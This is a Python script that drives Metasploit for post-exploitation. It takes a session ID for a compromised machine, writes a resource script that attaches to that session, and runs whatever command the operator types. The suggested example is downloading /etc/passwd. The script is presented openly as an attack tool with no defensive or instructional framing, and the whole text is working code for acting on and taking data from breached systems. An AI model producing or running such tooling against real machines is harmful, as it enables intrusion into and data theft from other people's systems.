import subprocess
import logging

def execute_post_exploit(session_identifier, exploit_task=None):
    """
    Perform customizable post-exploitation activities on a compromised system.
    
    Args:
        session_identifier (str): Metasploit session ID for the compromised machine.
        exploit_task (str): Post-exploitation task to run (e.g., 'getuid', 'download /etc/passwd').
    """
    # Ask for the task if not provided
    exploit_task = exploit_task or input("Specify post-exploitation task (e.g., 'getuid', 'download /etc/passwd'): ")
    
    # Generate the Metasploit resource script dynamically
    with open('post_exploit.rc', 'w') as resource_file:
        resource_file.write(f"sessions -i {session_identifier}\n")
        resource_file.write(f"{exploit_task}\n")

    try:
        # Run Metasploit with the generated resource script
        console_command = ['msfconsole', '-r', 'post_exploit.rc']
        print(f"Executing post-exploitation task: {exploit_task} on session {session_identifier}")
        result = subprocess.run(console_command, capture_output=True, text=True, timeout=600)
        
        # Output the result and log the same
        print(result.stdout)
        logging.info(f"Post-exploit output: {result.stdout}")
    
    except subprocess.TimeoutExpired:
        # Handle task timeout
        print(f"Post-exploitation task on session {session_identifier} timed out.")
        logging.error("Post-exploitation task timeout occurred.")
    
    except Exception as error:
        # Handle any other errors
        print(f"An error occurred: {error}")
        logging.error(f"Post-exploitation task failed with error: {error}")

if __name__ == "__main__":
    # Input from the user for session ID and task
    session_identifier = input("Enter the Metasploit session ID: ")
    exploit_task = input("Specify the post-exploitation task (optional): ")

    # Execute post-exploit tasks with provided inputs
    execute_post_exploit(session_identifier, exploit_task)
